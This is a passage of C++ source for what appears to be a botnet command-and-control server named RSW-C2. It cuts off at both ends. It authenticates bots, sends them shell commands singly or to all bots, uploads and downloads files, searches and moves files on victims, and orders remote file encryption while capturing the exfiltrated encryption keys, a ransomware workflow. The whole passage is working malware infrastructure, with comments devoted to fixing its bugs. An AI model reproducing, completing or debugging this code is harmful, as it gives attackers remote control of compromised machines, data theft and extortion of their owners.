            #endif
        }

        cout << "\033[1;31m[-] Server stopped listening\033[0m" << endl;

        // SHUTDOWN UAF FIX: join the listener thread FIRST — after this no new
        // client thread can be spawned, so the socket sweep in
        // joinClientThreads() below covers every thread that exists.
        // (Old order swept + cleared connected_clients while the listener was
        // still accepting → new entries appeared after the clear.)
        if (listener_thread.joinable()) {
            listener_thread.join();
        }
    }

    /*
     * SHUTDOWN UAF FIX: wake and join every per-bot response thread.
     *
     * These threads used to be detach()ed — nothing could ever wait for them,
     * so after ~RSW_C2() destroyed this object they could still touch
     * connected_clients / clients_mutex_ / cout (use-after-free).
     *
     * Wake-up mechanism: shutdown(SHUT_RDWR) on each client socket makes any
     * blocked recv() return <=0 immediately → the thread's normal disconnect
     * path runs (closes the fd, prints the line) and botResponseListener
     * returns → join() below completes without hanging.
     *
     * NOTE: we deliberately do NOT close() the sockets here — the response
     * thread is the single owner of its fd (its disconnect handler closes it).
     * Closing here too was the old double-close bug (fd could be recycled by
     * accept() in between → close() would kill an innocent new connection).
     */
    void joinClientThreads() {
        // 1) Shutdown (not close) all client sockets to unblock recv()
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                #ifdef _WIN32
                    shutdown(client.socket, SD_BOTH);
                #else
                    shutdown(client.socket, SHUT_RDWR);
                #endif
            }
        }

        // 2) Join all tracked threads
        std::lock_guard<std::mutex> tlock(client_threads_mutex_);
        for (auto& tt : client_threads_) {
            if (tt.t.joinable()) {
                tt.t.join();
            }
        }
        client_threads_.clear();
    }

    void acceptConnections() {
        while (listening) {
            struct sockaddr_in client_addr;
            socklen_t client_len = sizeof(client_addr);

            int client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
            if (client_socket < 0) {
                if (listening) {
                    cout << "\033[1;31mFailed to accept connection\033[0m" << endl;
                }
                continue;
            }

            ClientInfo client;
            client.socket = client_socket;
            client.ip = inet_ntoa(client_addr.sin_addr);
            client.port = ntohs(client_addr.sin_port);
            client.id = "Client_" + to_string(connected_clients.size() + 1);
            client.bot_id = "UNKNOWN";
            client.authenticated = false;
            client.connected_at = time(nullptr);
            client.last_seen = time(nullptr);

            {
                std::lock_guard<std::mutex> lock(clients_mutex_);
                connected_clients.push_back(client);
            }

            // Start response listener thread (handles auth + recv loop).
            // SHUTDOWN UAF FIX: the thread is TRACKED (not detached) so
            // ~RSW_C2() can join it. Each thread gets a done-flag; before
            // storing a new thread we reap already-finished ones so the
            // vector doesn't grow forever on a long-running server.
            auto done_flag = make_shared<atomic<bool>>(false);
            {
                std::lock_guard<std::mutex> tlock(client_threads_mutex_);
                // Reap: join + drop threads that already returned
                for (auto it = client_threads_.begin(); it != client_threads_.end(); ) {
                    if (it->done->load()) {
                        if (it->t.joinable()) it->t.join();
                        it = client_threads_.erase(it);
                    } else {
                        ++it;
                    }
                }
                client_threads_.push_back(TrackedThread{
                    thread([this, client, done_flag]() {
                        botResponseListener(client);  // returns on disconnect
                        done_flag->store(true);       // mark finished for reaper
                    }),
                    done_flag
                });
            }
        }
    }

    /*
     * BACKGROUND THREAD: per-bot response listener.
     *
     * Flow (raw TCP, no TLS):
     *   1. Receive identification (BOT_CONNECT:)
     *   2. Send session key (SESSION_KEY:)
     *   3. Main recv loop
     */
    void botResponseListener(ClientInfo client) {
        // ============================================================================
        // STEP 1: Receive bot identification (raw TCP recv)
        // ============================================================================
        char buffer[4096];
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = recv(client.socket, buffer, sizeof(buffer) - 1, 0);

        if (bytes_received <= 0) {
            // Connection failed (or shutdown during server exit woke us up).
            // Close the fd here — this thread is the socket's sole owner.
            #ifdef _WIN32
                closesocket(client.socket);
            #else
                close(client.socket);
            #endif
            return;
        }

        // First message might be encrypted - try both modes
        string identification(buffer, bytes_received);
        bool is_encrypted = false;

        // Try plain text first
        string plain_id = identification;
        plain_id.erase(plain_id.find_last_not_of(" \n\r\t") + 1);

        if (plain_id.substr(0, 12) == "BOT_CONNECT:") {
            is_encrypted = false;
        } else {
            // Try XOR decryption with 0x55 (bot's XOR key)
            string dec_id;
            for (size_t i = 0; i < bytes_received; i++) {
                dec_id += (char)((unsigned char)buffer[i] ^ 0x55);
            }
            dec_id.erase(dec_id.find_last_not_of(" \n\r\t") + 1);

            if (dec_id.substr(0, 12) == "BOT_CONNECT:") {
                identification = dec_id;
                is_encrypted = true;
            } else {
                cout << "\033[1;31m[-] Unauthenticated connection from "
                     << client.ip << ":" << client.port << "\033[0m" << endl;
                // Close the fd — this thread is the socket's sole owner
                // (stopListening no longer closes client sockets).
                #ifdef _WIN32
                    closesocket(client.socket);
                #else
                    close(client.socket);
                #endif
                return;
            }
        }

        // Update auth status in connected_clients vector
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& c : connected_clients) {
                if (c.socket == client.socket) {
                    // Trim trailing newlines/spaces from bot_id
                    string raw_bot_id = identification.substr(12);
                    size_t end = raw_bot_id.find_last_not_of(" \n\r\t");
                    if (end != string::npos) raw_bot_id = raw_bot_id.substr(0, end + 1);
                    c.bot_id = raw_bot_id;
                    c.authenticated = true;

                    // Generate session key for this client
                    random_device rd;
                    mt19937 gen(rd());
                    for (int i = 0; i < 32; i++) {
                        c.session_key[i] = (unsigned char)(rd() ^ (i * 17 + 31));
                    }
                    // NOTE: session_encryption is intentionally NOT set yet!
                    // The first SESSION_KEY message must be sent WITHOUT XOR encryption
                    // because the client doesn't have the key yet.

                    // Send session key + welcome — raw TCP, WRAPPED ONLY, NO AEAD ENCRYPTION
                    // (encryptForClient checks session_encryption which is still false).
                    // The key bytes are XOR-obfuscated with a fixed key so a passive
                    // sniffer can't trivially read the session key off the wire.
                    // (Same trust level as the BOT_CONNECT XOR; real PFS would need
                    // TLS. The client XOR-decodes after unwrap.)
                    string key_exchange = "SESSION_KEY:" + string((char*)c.session_key, 32);
                    string welcome_msg = "RSW-C2: Bot " + c.bot_id + " connected successfully!\n";
                    string combined = key_exchange + welcome_msg;
                    for (size_t _kx = 0; _kx < combined.size(); _kx++) combined[_kx] ^= 0x5A;
                    string wrapped = wrapForTransport(combined);
                    send(c.socket, wrapped.c_str(), wrapped.length(), 0);

                    // NOW enable session encryption for all subsequent messages
                    c.session_encryption = true;
                    memcpy(client.session_key, c.session_key, 32);
                    client.session_encryption = true;

                    cout << "\033[1;32m[+] Bot authenticated: " << c.bot_id
                         << " (" << c.ip << ":" << c.port << ") [encrypted]\033[0m" << endl;

                    // IMPORTANT: Update the local parameter copy's encryption state so the
                    // recv loop below can decrypt properly (botResponseListener takes client BY VALUE)
                    client.bot_id = c.bot_id;  // Also sync bot_id so disconnect message shows correct ID
                    memcpy(client.session_key, c.session_key, 32);
                    client.session_encryption = true;

                    break;
                }
            }
        }

        // ============================================================================
        // STEP 3: Main recv loop — TCP stream reassembly + frame extraction
        // ============================================================================
        // TCP is a byte stream: frames can arrive split across recv() calls or
        // coalesced. The bot prefixes every encrypted message with a plaintext
        // 4-byte BE length (see sendEncryptedCommand). We buffer incoming bytes
        // and only decrypt/unwrap COMPLETE frames, so partial data can never
        // desync the stream or be misparsed as a command response.
        string stream_buffer;
        while (listening) {
            char recv_buffer[8192];
            int n = recv(client.socket, recv_buffer, sizeof(recv_buffer), 0);

            if (n <= 0) {
                string disconnect_reason = (n == 0) ? "connection closed by peer" : "recv error";
                cout << "\033[1;31m[-] Bot disconnected: " << client.bot_id
                     << " (reason: " << disconnect_reason << ")\033[0m" << endl;
                // Mark client as disconnected so UI can detect it
                {
                    std::lock_guard<std::mutex> lock(clients_mutex_);
                    for (auto& c : connected_clients) {
                        if (c.socket == client.socket) {
                            c.authenticated = false;
                            #ifdef _WIN32
                                closesocket(client.socket);
                            #else
                                close(client.socket);
                            #endif
                            break;
                        }
                    }
                    // Dangling pointer fix: if the selected bot disconnected, null it out
                    if (selected_bot_socket == client.socket) {
                        selected_bot_socket = -1;
                        selected_bot_id.clear();
                        in_session = false;
                    }
                }
                return;
            }

            stream_buffer.append(recv_buffer, n);

            // Extract all complete frames currently buffered
            while (stream_buffer.size() >= 4) {
                size_t flen = ((unsigned char)stream_buffer[0] << 24) |
                              ((unsigned char)stream_buffer[1] << 16) |
                              ((unsigned char)stream_buffer[2] << 8)  |
                              ((unsigned char)stream_buffer[3]);
                if (flen > 0x0FFFFFFF) {           // sanity cap
                    stream_buffer.clear();
                    break;
                }
                if (stream_buffer.size() < 4 + flen) break;  // frame not complete yet

                string frame = stream_buffer.substr(4, flen);
                stream_buffer.erase(0, 4 + flen);

                string decrypted = decryptFromClient(client, frame);
                string message = unwrapFromTransport(decrypted);
                message.erase(message.find_last_not_of(" \n\r\t") + 1);

                // Check for KEY_EXFIL messages — auto-capture encryption keys
                // CRITICAL: KEY_EXFIL is a SIDE channel, not a command response.
                // If we let it fall through to the pending_response storage below,
                // executeCommand's polling loop would treat it as the bot's reply
                // to its command (KEY_EXFIL arrives BEFORE the actual command output,
                // because handleEncryptFile sends KEY_EXFIL first, then the response).
                // Result: executeCommand prints KEY_EXFIL payload instead of the
                // expected DOWNLOAD:/RUN_OUTPUT:/etc. response → silent wrong-answer bug.
                //
                // Fix: branch explicitly. KEY_EXFIL goes only into exfiltrated_keys;
                // pending_response is updated only for genuine command responses.
                bool is_key_exfil = (message.length() >= 10 && message.substr(0, 10) == "KEY_EXFIL:");
                if (is_key_exfil) {
                    // Format: KEY_EXFIL:bot_id|file_path|algo|key
                    // '|' separators: file_path may contain ':' on Windows
                    // (C:\...) — the old ':' split shifted algo/key extraction
                    // into the path bytes on every Windows exfil.
                    string payload = message.substr(10);
                    size_t sep1 = payload.find('|');
                    size_t sep2 = payload.find('|', sep1 + 1);
                    size_t sep3 = payload.find('|', sep2 + 1);

                    if (sep1 != string::npos && sep2 != string::npos && sep3 != string::npos) {
                        string bot_id = payload.substr(0, sep1);
                        string file_path = payload.substr(sep1 + 1, sep2 - sep1 - 1);
                        string algo = payload.substr(sep2 + 1, sep3 - sep2 - 1);
                        string key = payload.substr(sep3 + 1);

                        // Build human-readable key info
                        string key_info = "Algorithm: " + algo + " | Key: " + key;

                        // Store in exfiltrated_keys map (thread-safe)
                        {
                            std::lock_guard<std::mutex> klock(keys_mutex_);
                            exfiltrated_keys[bot_id].push_back({file_path, key_info});
                        }

                        cout << "\033[1;32m[KEY_EXFIL] Captured key from " << bot_id << " for " << file_path << "\033[0m" << endl;
                        cout << "\033[1;33m  Algorithm: " << algo << " | Key: " << key << "\033[0m" << endl;
                        cout << "\033[1;33m  Use 'show_key' command to view all captured keys\033[0m" << endl;
                    }
                    // Do NOT continue to pending_response storage — KEY_EXFIL is
                    // a side-channel event, not a command reply.
                    continue;
                }

                // Store response for the UI thread (executeCommand, etc.)
                {
                    std::lock_guard<std::mutex> lock(clients_mutex_);
                    for (auto& c : connected_clients) {
                        if (c.socket == client.socket) {
                            c.pending_response = message;
                            c.response_ready = true;
                            break;
                        }
                    }
                }
            }
        }

        // Loop exited because listening went false (server shutdown) while we
        // were between recvs — the n<=0 path above didn't run, so close the fd
        // here (this thread is the socket's sole owner).
        #ifdef _WIN32
            closesocket(client.socket);
        #else
            close(client.socket);
        #endif
    }

    /*
     * Send a command to a specific bot and wait for its response.
     * Uses response_ready flag set by botResponseListener thread.
     */
    void executeCommand(const string& input) {
        // Format: execute [bot_id] [command]
        istringstream iss(input);
        string cmd, bot_id, actual_command;

        iss >> cmd >> bot_id;
        getline(iss, actual_command);
        if (!actual_command.empty() && actual_command[0] == ' ') {
            actual_command = actual_command.substr(1);
        }

        if (bot_id.empty() || actual_command.empty()) {
            cout << "\033[1;31mUsage: execute [bot_id] [command]\033[0m" << endl;
            cout << "\033[1;33mExample: execute MAC_A1B2C3 whoami\033[0m" << endl;
            return;
        }

        // Find the bot and copy what we need (thread-safe)
        int target_socket = -1;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.bot_id == bot_id && client.authenticated) {
                    target_socket = client.socket;
                    break;
                }
            }
        }

        if (target_socket < 0) {
            cout << "\033[1;31mBot '" << bot_id << "' not found or not authenticated\033[0m" << endl;
            cout << "\033[1;33mUse 'bots' command to see available bots\033[0m" << endl;
            return;
        }

        cout << "\033[1;36m[EXECUTING] " << bot_id << " -> " << actual_command << "\033[0m" << endl;

        // Send command — NO LOCK held (botResponseListener can deliver responses)
        string full_command = actual_command + "\n";
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.socket == target_socket && client.authenticated) {
                    // Clear previous response
                    client.response_ready = false;
                    client.pending_response.clear();
                    // Send (encrypted)
                    sendEncryptedCommand(client, full_command);
                    break;
                }
            }
        }

        // Wait for response — NO LOCK (botResponseListener can set response_ready)
        for (int attempt = 0; attempt < 100; attempt++) {
            {
                std::lock_guard<std::mutex> lock(clients_mutex_);
                for (auto& client : connected_clients) {
                    if (client.socket == target_socket && client.response_ready) {
                        cout << "\033[1;32m[OUTPUT from " << bot_id << "]\033[0m" << endl;
                        cout << "\033[1;37m" << client.pending_response << "\033[0m" << endl;
                        client.response_ready = false;
                        return;
                    }
                }
            }
            this_thread::sleep_for(chrono::milliseconds(100));
        }

        cout << "\033[1;31m[TIMEOUT] No response from bot within 10s\033[0m" << endl;
    }

    string generateTransferID() {
        static int counter = 0;
        return "T" + to_string(time(nullptr)) + "_" + to_string(++counter);
    }

    void showProgress(size_t current, size_t total, const string& operation) {
        int percent = (int)((current * 100) / total);
        int bar_width = 40;
        int filled = (percent * bar_width) / 100;

        cout << "\r\033[1;36m[" << operation << "] ";
        cout << "[";
        for (int i = 0; i < bar_width; i++) {
            if (i < filled) cout << "█";
            else cout << "░";
        }
        cout << "] " << percent << "% (" << current << "/" << total << " chunks)";
        cout << "\033[0m";
        cout.flush();
    }

    void uploadFileChunked(const string& input) {
        // Format: upload [bot_id] [local_file] [remote_path]
        istringstream iss(input);
        string cmd, bot_id, local_file, remote_path;

        iss >> cmd >> bot_id >> local_file >> remote_path;

        if (bot_id.empty() || local_file.empty() || remote_path.empty()) {
            cout << "\033[1;31mUsage: upload [bot_id] [local_file] [remote_path]\033[0m" << endl;
            cout << "\033[1;33mExample: upload MAC_A1B2C3 /home/test.txt /tmp/test.txt\033[0m" << endl;
            return;
        }

        // Find the bot and extract state (brief lock — released before file I/O)
        int target_socket = -1;
        ClientInfo send_ctx;  // minimal copy: socket + encryption only
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.bot_id == bot_id && client.authenticated) {
                    target_socket = client.socket;
                    memcpy(send_ctx.session_key, client.session_key, 32);
                    send_ctx.session_encryption = client.session_encryption;
                    break;
                }
            }
        }

        if (target_socket < 0) {
            cout << "\033[1;31mBot '" << bot_id << "' not found or not authenticated\033[0m" << endl;
            return;
        }
        send_ctx.socket = target_socket;

        // Read local file
        ifstream file(local_file, ios::binary);
        if (!file.is_open()) {
            cout << "\033[1;31mFailed to read file: " << local_file << "\033[0m" << endl;
            return;
        }

        // Get file size
        file.seekg(0, ios::end);
        size_t file_size = file.tellg();
        file.seekg(0, ios::beg);

        size_t total_chunks = (file_size + CHUNK_SIZE - 1) / CHUNK_SIZE;
        string transfer_id = generateTransferID();

        cout << "\033[1;36m[UPLOAD] Starting chunked upload: " << local_file << "\033[0m" << endl;
        cout << "\033[1;36m[UPLOAD] File size: " << file_size << " bytes, " << total_chunks << " chunks\033[0m" << endl;

        // Send upload start command (encrypted) — NO LOCK, uses local send_ctx copy
        // '|' separators: remote_path may contain ':' on Windows (C:\Temp\x)
        // — the bot parses on '|' so drive letters survive intact.
        string start_cmd = "UPLOAD_START:" + remote_path + "|" + to_string(file_size) + "|" + to_string(total_chunks) + "|" + transfer_id + "\n";
        sendEncryptedCommand(send_ctx, start_cmd);

        // Send chunks (encrypted) — NO LOCK
        for (size_t chunk_num = 0; chunk_num < total_chunks; chunk_num++) {
            char buffer[CHUNK_SIZE];
            file.read(buffer, CHUNK_SIZE);
            size_t bytes_read = file.gcount();

            string chunk_data(buffer, bytes_read);
            string hex_chunk = bytesToHex(chunk_data);

            string chunk_cmd = "UPLOAD_CHUNK:" + transfer_id + ":" + to_string(chunk_num) + "/" + to_string(total_chunks) + ":" + hex_chunk + "\n";

            if (!sendEncryptedCommand(send_ctx, chunk_cmd)) {
                cout << "\n\033[1;31m[FAILED] Failed to send chunk " << chunk_num << "\033[0m" << endl;
                file.close();
                return;
            }

            showProgress(chunk_num + 1, total_chunks, "UPLOAD");
            this_thread::sleep_for(chrono::milliseconds(10)); // Small delay
        }

        file.close();

        // Send upload end command (encrypted) — NO LOCK
        string end_cmd = "UPLOAD_END:" + transfer_id + "\n";
        sendEncryptedCommand(send_ctx, end_cmd);

        cout << "\n\033[1;32m[SUCCESS] File uploaded to " << remote_path << "\033[0m" << endl;
    }

    void uploadFile(const string& input) {
        uploadFileChunked(input);
    }

    void downloadFile(const string& input) {
        // Format: download [bot_id] [remote_file] [local_path]
        istringstream iss(input);
        string cmd, bot_id, remote_file, local_path;

        iss >> cmd >> bot_id >> remote_file >> local_path;

        if (bot_id.empty() || remote_file.empty() || local_path.empty()) {
            cout << "\033[1;31mUsage: download [bot_id] [remote_file] [local_path]\033[0m" << endl;
            cout << "\033[1;33mExample: download MAC_A1B2C3 /tmp/test.txt ./downloaded.txt\033[0m" << endl;
            return;
        }

        // Find the bot and extract state (brief lock — released before recv I/O)
        int target_socket = -1;
        ClientInfo recv_ctx;  // minimal copy: socket + encryption only
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.bot_id == bot_id && client.authenticated) {
                    target_socket = client.socket;
                    memcpy(recv_ctx.session_key, client.session_key, 32);
                    recv_ctx.session_encryption = client.session_encryption;
                    break;
                }
            }
        }

        if (target_socket < 0) {
            cout << "\033[1;31mBot '" << bot_id << "' not found or not authenticated\033[0m" << endl;
            return;
        }
        recv_ctx.socket = target_socket;

        // Send download command to bot (encrypted)
        string download_command = "DOWNLOAD:" + remote_file + "\n";

        cout << "\033[1;36m[DOWNLOAD] Requesting file: " << remote_file << " from " << bot_id << "\033[0m" << endl;

        if (!sendEncryptedCommand(recv_ctx, download_command)) {
            cout << "\033[1;31mFailed to send download command to bot\033[0m" << endl;
            return;
        }

        // Wait for response via the botResponseListener thread (pending_response).
        // Direct recv() here would RACE with the listener thread on the same
        // socket — both would pull bytes and corrupt frames. Polling is the same
        // pattern executeCommand uses, so one thread always owns recv.
        string response;
        for (int attempt = 0; attempt < 300; attempt++) {  // up to 30s for large files
            {
                std::lock_guard<std::mutex> lock(clients_mutex_);
                for (auto& c : connected_clients) {
                    if (c.socket == target_socket && c.response_ready) {
                        response = c.pending_response;
                        c.response_ready = false;
                        c.pending_response.clear();
                        break;
                    }
                }
            }
            if (!response.empty()) break;
            this_thread::sleep_for(chrono::milliseconds(100));
        }
        if (response.empty()) {
            cout << "\033[1;31m[TIMEOUT] No download response from bot within 30s\033[0m" << endl;
            return;
        }

        // Check for DOWNLOAD: prefix after decryption
        if (response.length() > 9 && response.substr(0, 9) == "DOWNLOAD:") {
            // '|' separator (matches the bot's response build): the old ':' split
            // shifted on every Windows path (C:\...) before the hex payload.
            // Extract HEX data from response
            size_t sep_pos = response.find('|', 9);
            if (sep_pos != string::npos) {
                string hex_data = response.substr(sep_pos + 1);
                hex_data.erase(hex_data.find_last_not_of(" \n\r\t") + 1); // Trim

                if (writeHexToFile(hex_data, local_path)) {
                    cout << "\033[1;32m[SUCCESS] File downloaded to " << local_path << "\033[0m" << endl;
                    cout << "\033[1;33m[INFO] Size: " << hex_data.length()/2 << " bytes\033[0m" << endl;
                } else {
                    cout << "\033[1;31m[FAILED] Could not write to " << local_path << "\033[0m" << endl;
                }
            } else {
                cout << "\033[1;31m[FAILED] Invalid download response format\033[0m" << endl;
            }
        } else if (response.find("DOWNLOAD_ERROR") != string::npos) {
            cout << "\033[1;31m[FAILED] " << response << "\033[0m" << endl;
        } else {
            cout << "\033[1;31m[FAILED] Unknown response: " << response << "\033[0m" << endl;
        }
    }

    void sendSimpleCommand(const string& input, const string& command_prefix) {
        istringstream iss(input);
        string cmd, bot_id;
        iss >> cmd >> bot_id;

        if (bot_id.empty()) {
            cout << "\033[1;31mUsage: " << cmd << " [bot_id] [args...]\033[0m" << endl;
            return;
        }

        int target_socket = -1;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.bot_id == bot_id && client.authenticated) {
                    target_socket = client.socket;
                    break;
                }
            }
        }

        if (target_socket < 0) {
            cout << "\033[1;31mBot '" << bot_id << "' not found or not authenticated\033[0m" << endl;
            return;
        }

        string args;
        size_t bot_id_pos = input.find(bot_id);
        if (bot_id_pos != string::npos) {
            size_t args_start = bot_id_pos + bot_id.length();
            if (args_start < input.length()) {
                args = trim(input.substr(args_start));
            }
        }

        // Always emit the colon terminator — the client matches prefixes like
        // "AV_CHECK:", "KILL:", "DIR_LIST:". Old code only added the colon when
        // args existed, so arg-less commands ("AV_CHECK\n") fell through to
        // shell execution on the bot instead of being dispatched.
        string full_command = command_prefix + ":" + (args.empty() ? "" : args) + "\n";
        cout << "\033[1;36m[" << cmd << "] Sending to " << bot_id << "\033[0m" << endl;

        // Send command — brief lock to clear + send
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.socket == target_socket && client.authenticated) {
                    client.response_ready = false;
                    client.pending_response.clear();
                    sendEncryptedCommand(client, full_command);
                    break;
                }
            }
        }

        // Wait for response — NO LOCK held (botResponseListener can deliver)
        for (int attempt = 0; attempt < 100; attempt++) {
            {
                std::lock_guard<std::mutex> lock(clients_mutex_);
                for (auto& client : connected_clients) {
                    if (client.socket == target_socket && client.response_ready) {
                        cout << "\033[1;32m[RESPONSE from " << bot_id << "]\033[0m" << endl;
                        cout << "\033[1;37m" << client.pending_response << "\033[0m" << endl;
                        client.response_ready = false;
                        return;
                    }
                }
            }
            this_thread::sleep_for(chrono::milliseconds(100));
        }
        cout << "\033[1;31m[TIMEOUT] No response from bot within 10s\033[0m" << endl;
    }

    void execEncryptCommand(const string& input) {
        // Format: encrypt <bot_id> <file_path>
        istringstream iss(input);
        string cmd, bot_id, file_path;
        iss >> cmd >> bot_id;

        // Get the rest as file path
        getline(iss, file_path);
        if (!file_path.empty() && file_path[0] == ' ') {
            file_path = file_path.substr(1);
        }

        // Remove any trailing whitespace
        size_t end = file_path.find_last_not_of(" \t\n\r");
        if (end != string::npos) {
            file_path = file_path.substr(0, end + 1);
        }

        if (bot_id.empty() || file_path.empty()) {
            cout << "\033[1;31m[ERROR] Usage: encrypt <bot_id> <file_path>\033[0m" << endl;
            return;
        }

        // Find the bot — brief lock
        int target_socket = -1;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.bot_id == bot_id && client.authenticated) {
                    target_socket = client.socket;
                    break;
                }
            }
        }

        if (target_socket < 0) {
            cout << "\033[1;31m[ERROR] Bot not found: " << bot_id << "\033[0m" << endl;
            return;
        }

        cout << "\033[1;33m[*] Sending ENCRYPT command to " << bot_id << "\033[0m" << endl;
        cout << "\033[1;33m[*] Target file: " << file_path << "\033[0m" << endl;

        // Send command — brief lock to clear + send
        string full_command = "ENCRYPT_FILE:" + file_path + "\n";
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.socket == target_socket && client.authenticated) {
                    client.response_ready = false;
                    client.pending_response.clear();
                    sendEncryptedCommand(client, full_command);
                    break;
                }
            }
        }

        // Wait for response — NO LOCK held
        for (int attempt = 0; attempt < 100; attempt++) {
            {
                std::lock_guard<std::mutex> lock(clients_mutex_);
                for (auto& client : connected_clients) {
                    if (client.socket == target_socket && client.response_ready) {
                        cout << "\033[1;32m[RESPONSE from " << bot_id << "]\033[0m" << endl;
                        cout << "\033[1;37m" << client.pending_response << "\033[0m" << endl;
                        client.response_ready = false;
                        return;
                    }
                }
            }
            this_thread::sleep_for(chrono::milliseconds(100));
        }
        cout << "\033[1;31m[TIMEOUT] No response from bot within 10s\033[0m" << endl;
    }

    // ============================================================================
    // FILE-SEARCH — Search files on bot with proper colon-delimited protocol
    // Usage: file-search <bot_id> <pattern> [path]
    // Sends: FILE_SEARCH:<pattern>:<path>
    // ============================================================================
    void execFileSearch(const string& input) {
        istringstream iss(input);
        string cmd, bot_id, pattern, search_path;
        iss >> cmd >> bot_id >> pattern;

        if (bot_id.empty() || pattern.empty()) {
            cout << "\033[1;31m[ERROR] Usage: file-search <bot_id> <pattern> [path]\033[0m" << endl;
            cout << "\033[1;33mExample: file-search MAC_A1B2C3 *.txt /tmp\033[0m" << endl;
            return;
        }

        // Extract optional path using bot_id anchor (more robust than find(pattern))
        size_t bot_id_pos = input.find(bot_id);
        if (bot_id_pos != string::npos) {
            string after_bot = input.substr(bot_id_pos + bot_id.length());
            after_bot = trim(after_bot);
            // after_bot is "pattern [path]" — skip the pattern part
            size_t pat_len = pattern.length();
            if (after_bot.length() > pat_len) {
                string remainder = after_bot.substr(pat_len);
                search_path = trim(remainder);
            }
        }

        // Find the bot
        int target_socket = -1;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.bot_id == bot_id && client.authenticated) {
                    target_socket = client.socket;
                    break;
                }
            }
        }

        if (target_socket < 0) {
            cout << "\033[1;31m[ERROR] Bot not found: " << bot_id << "\033[0m" << endl;
            return;
        }

        // '|' separator: Windows paths contain ':' — bot splits on '|'
        string full_command = "FILE_SEARCH:" + pattern + "|" + search_path + "\n";
        cout << "\033[1;36m[FILE-SEARCH] Searching '" << pattern << "' on " << bot_id;
        if (!search_path.empty()) cout << " in " << search_path;
        cout << "\033[0m" << endl;

        // Send command
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.socket == target_socket && client.authenticated) {
                    client.response_ready = false;
                    client.pending_response.clear();
                    sendEncryptedCommand(client, full_command);
                    break;
                }
            }
        }

        // Wait for response
        for (int attempt = 0; attempt < 100; attempt++) {
            {
                std::lock_guard<std::mutex> lock(clients_mutex_);
                for (auto& client : connected_clients) {
                    if (client.socket == target_socket && client.response_ready) {
                        cout << "\033[1;32m[RESPONSE from " << bot_id << "]\033[0m" << endl;
                        cout << "\033[1;37m" << client.pending_response << "\033[0m" << endl;
                        client.response_ready = false;
                        return;
                    }
                }
            }
            this_thread::sleep_for(chrono::milliseconds(100));
        }
        cout << "\033[1;31m[TIMEOUT] No response from bot within 10s\033[0m" << endl;
    }

    // ============================================================================
    // FILE-MOVE — Move/rename file on bot with proper colon-delimited protocol
    // Usage: file-move <bot_id> <source> <destination>
    // Sends: FILE_MOVE:<source>:<destination>
    // ============================================================================
    void execFileMove(const string& input) {
        istringstream iss(input);
        string cmd, bot_id, source, destination;
        iss >> cmd >> bot_id >> source >> destination;

        if (bot_id.empty() || source.empty() || destination.empty()) {
            cout << "\033[1;31m[ERROR] Usage: file-move <bot_id> <source> <destination>\033[0m" << endl;
            cout << "\033[1;33mExample: file-move MAC_A1B2C3 /tmp/old.txt /tmp/new.txt\033[0m" << endl;
            return;
        }

        // Find the bot
        int target_socket = -1;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.bot_id == bot_id && client.authenticated) {
                    target_socket = client.socket;
                    break;
                }
            }
        }

        if (target_socket < 0) {
            cout << "\033[1;31m[ERROR] Bot not found: " << bot_id << "\033[0m" << endl;
            return;
        }

        // '|' separator: Windows paths contain ':' — bot splits on '|'
        string full_command = "FILE_MOVE:" + source + "|" + destination + "\n";
        cout << "\033[1;36m[FILE-MOVE] " << source << " -> " << destination << " on " << bot_id << "\033[0m" << endl;

        // Send command
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& client : connected_clients) {
                if (client.socket == target_socket && client.authenticated) {
                    client.response_ready = false;
                    client.pending_response.clear();
                    sendEncryptedCommand(client, full_command);
                    break;
                }
            }
        }

        // Wait for response
        for (int attempt = 0; attempt < 100; attempt++) {
            {
                std::lock_guard<std::mutex> lock(clients_mutex_);
                for (auto& client : connected_clients) {
                    if (client.socket == target_socket && client.response_ready) {
                        cout << "\033[1;32m[RESPONSE from " << bot_id << "]\033[0m" << endl;
                        cout << "\033[1;37m" << client.pending_response << "\033[0m" << endl;
                        client.response_ready = false;
                        return;
                    }
                }
            }
            this_thread::sleep_for(chrono::milliseconds(100));
        }
        cout << "\033[1;31m[TIMEOUT] No response from bot within 10s\033[0m" << endl;
    }

    void execAllCommand(const string& input) {
        // Format: exec-all <command>
        size_t space_pos = input.find(' ');
        if (space_pos == string::npos || space_pos + 1 >= input.length()) {
            cout << "\033[1;31mUsage: exec-all <command>\033[0m" << endl;
            return;
        }

        string command = input.substr(space_pos + 1);
        command = trim(command);

        if (command.empty()) {
            cout << "\033[1;31mCommand cannot be empty\033[0m" << endl;
            return;
        }

        // Snapshot authenticated bots (thread-safe) — copy only socket+bot_id.
        // DEADLOCK FIX: clients_mutex_ must NOT be held while waiting for
        // responses, otherwise botResponseListener can never set response_ready
        // (it needs the same mutex) → every bot times out after 10s.
        struct ExecTarget { int socket; string bot_id; };
        vector<ExecTarget> targets;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (const auto& client : connected_clients) {
                if (client.authenticated) {
                    targets.push_back({client.socket, client.bot_id});
                }
            }
        }

        if (targets.empty()) {
            cout << "\033[1;31mNo authenticated bots available\033[0m" << endl;
            return;
        }

        cout << "\033[1;36m[EXEC-ALL] Sending '" << command << "' to " << targets.size() << " bots\033[0m" << endl;
